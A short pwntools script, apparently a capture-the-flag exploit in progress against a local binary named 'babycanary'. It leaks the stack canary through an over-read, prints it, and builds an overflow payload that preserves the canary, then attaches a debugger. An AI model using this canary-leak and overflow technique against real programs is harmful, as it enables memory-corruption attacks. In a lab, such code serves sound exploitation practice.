from pwn import *

io=process('./babycanary')
elf=ELF('./babycanary')
libc=ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

payload="a" * 8
io.sendlineafter("Who are U?\n",payload)
io.recvuntil("a" * 8 + '\n')
Canary=u64(io.recv(7).rjust(8,b'\x00'))
print("canary=>"+hex(Canary))
payload="a" * 8 + p64(Canary).decode('latin-1') +  "a" * 8  

io.sendlineafter("I'll give you a chance to change your name:",payload)
gdb.attach(io,"b *0x55DE68AD3327")
pause()

